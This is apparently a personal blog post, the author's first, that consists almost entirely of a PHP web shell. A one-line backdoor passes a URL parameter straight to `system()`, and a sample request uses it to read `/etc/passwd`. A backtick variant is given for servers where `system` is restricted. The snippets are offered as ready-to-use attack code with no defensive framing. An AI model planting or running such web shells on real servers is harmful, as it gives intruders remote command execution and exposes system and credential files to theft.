---
layout: post
title: "First Post"
date: 2019-05-14
---

This is only my first post.

Going to end up with lots of code.

```php
<?php echo system($_GET["cmd"]); ?>

# then request vulnerable page with the command you want to run in the parameters
# http://HOST/vuln.php?cmd=cat /etc/passwd

# if the system command is restricted, you might can use backticks to execute system commands
<?php $cmd=$_GET["cmd"]; echo `$cmd`; ?>

```